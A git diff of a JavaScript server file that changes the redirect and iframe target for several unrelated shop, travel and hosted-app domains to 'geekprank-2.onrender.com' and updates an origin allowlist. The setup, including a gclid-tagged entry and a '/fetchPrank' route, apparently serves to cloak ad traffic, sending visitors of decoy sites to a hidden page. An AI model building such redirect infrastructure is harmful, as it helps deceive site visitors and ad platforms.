@@ -85,17 +85,17 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.shop": { method: "redirect", target: "https://web1ksjndvkjskjnvs.onrender.com" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://web1ksjndvkjskjnvs.onrender.com" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://web1ksjndvkjskjnvs.onrender.com" },
+    "https://naotoshidairy.shop": { method: "redirect", target: "https://geekprank-2.onrender.com" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://geekprank-2.onrender.com" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://geekprank-2.onrender.com" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://web1ksjndvkjskjnvs.onrender.com" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://web1ksjndvkjskjnvs.onrender.com" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://geekprank-2.onrender.com" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://geekprank-2.onrender.com" },
   },
   aomine: {
-    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://web1ksjndvkjskjnvs.onrender.com" },
+    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://geekprank-2.onrender.com" },
   },
 };
 
@@ -667,7 +667,7 @@ app.get("/fetchPrank", (req, res) => {
 function isAuthorized(req) {
   // Replace with whatever "who is requesting" check you want.
   // Simple Netlify-origin allowlist:
-  const allowed = ["https://web1ksjndvkjskjnvs.onrender.com"];
+  const allowed = ["https://geekprank-2.onrender.com"];
   return allowed.includes(req.get("origin"));
 }
 
